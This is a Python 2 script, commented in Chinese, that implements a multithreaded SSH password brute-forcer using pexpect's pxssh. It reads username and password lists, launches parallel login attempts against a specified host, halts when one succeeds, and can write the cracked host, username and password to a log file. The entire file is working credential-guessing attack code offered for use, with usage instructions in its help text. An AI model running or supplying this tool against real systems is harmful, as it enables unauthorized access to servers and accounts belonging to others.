# -*- coding: utf-8 -*-
from pexpect import pxssh
import argparse
import time
import os
import threading


threads = []
maxConnections = 5
lock = threading.Lock()
connection_lock = threading.BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0


def connect(args, host, user, password, release):
    global Found, Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)  # 只有连接成功才执行下面的程序，不然被捕捉错误再重新尝试连接
        print '[+] Password Found: ' + password
        if args.save == True:
            write_to_file(host, user, password)
        Found = True
    except Exception, e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(args, host, user, password, False)
        elif 'synchronsize with original prompt ' in str(e):
            time.sleep(1)
            connect(args, host, user, password, False)
    finally:
        if release:
            # lock.release()
            connection_lock.release()


def use_passwd_file(args):
    password_list = []
    passwdFile = args.passwdFile
    fn = open(passwdFile + '.txt', 'r')
    for line in fn.readlines():
        password = line.strip('\r').strip('\n')
        password_list.append(password)
    return password_list


def write_to_file(host, user, password):
    save = True
    host_line = ''
    # 检验是否重复存在相同的host和相同的用户名,相同则不存入
    if os.path.exists('./log_ssh.txt'):
        with open('log_ssh.txt', 'r') as f1:
            for line in f1.readlines():
                if host in line:
                    host_line = line
                    continue
                if 'username' in line:
                    if host in host_line and user in line:
                        save = False
    if save:
        file_string = "Host: {}\r\nusername: {}\r\npassword: {}\r\n-----\r\n".format(host, user, password)
        with open('log_ssh.txt', 'a') as f2:
            f2.write(file_string)


# 出现正确的用户名和密码则停止爆破
def check_connection():
    if Found:
        print "[*] Exiting:Password and Username had Found"
        exit(0)
    if Fails > 5:
        print "[!] Exiting: Too many Socket Timeout"
        exit(0)


def use_parser():
    parser = argparse.ArgumentParser(usage='%(prog)s is an exploded connection of ssh',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     description="""
Description:
    You should provide a host,and then you can run as below to explode:
    1. %(prog)s -H x.x.x.x -u xxx -P xxx(filename)
    2. %(prog)s -H x.x.x.x -U xxx(filename) -P xxx(filename)
    ---
    By the way,you can choose to add "--Sa" at the end to save the useful information!
---------------------------------------------------------------""")
    parser.add_argument('-H', dest='tgthost', type=str, help='specify the target host')
    parser.add_argument('-P', dest='passwdFile', type=str, help='For example,the passwd.txt in file')
    parser.add_argument('-u', dest='user', type=str, help='specify the user you provide')
    parser.add_argument('-U', dest='UserFile', type=str, help='For example,the user.txt in file')
    parser.add_argument('--Sa', dest='save', action='store_true', help='Save the right username and password')
    parser.set_defaults(func=use_passwd_file)
    args = parser.parse_args()
    return args


def main():
    args = use_parser()
    host = args.tgthost

    if args.UserFile is not None and args.user is None:
        with open(args.UserFile + '.txt', 'r') as fn1:
            for line1 in fn1.readlines():
                check_connection()  # 调用检查，如果发现用户名和密码匹配则停止程序
                user = line1.strip('\r').strip('\n')
                print '\n' + '[---Testing Username is: {}---]'.format(str(user))
                for password in args.func(args):
                    # lock.acquire()
                    check_connection()
                    connection_lock.acquire()
                    print '[-] Testing password: ' + str(password)
                    t = threading.Thread(target=connect, args=(args, host, user, password, True))
                    t.start()
                time.sleep(2.5)  # 由于线程响应问题，为了等待最后的结果显示出出来才开始下一个用户的测试
    elif args.UserFile is None and args.user is not None:
        print '\n' + '[---Testing Username is: {}---]'.format(str(args.user))
        for password in args.func(args):
            check_connection()
            connection_lock.acquire()
            print '[-] Testing password: ' + str(password)
            t = threading.Thread(target=connect, args=(args, host, args.user, password, True))
            t.start()


if __name__ == '__main__':
    main()
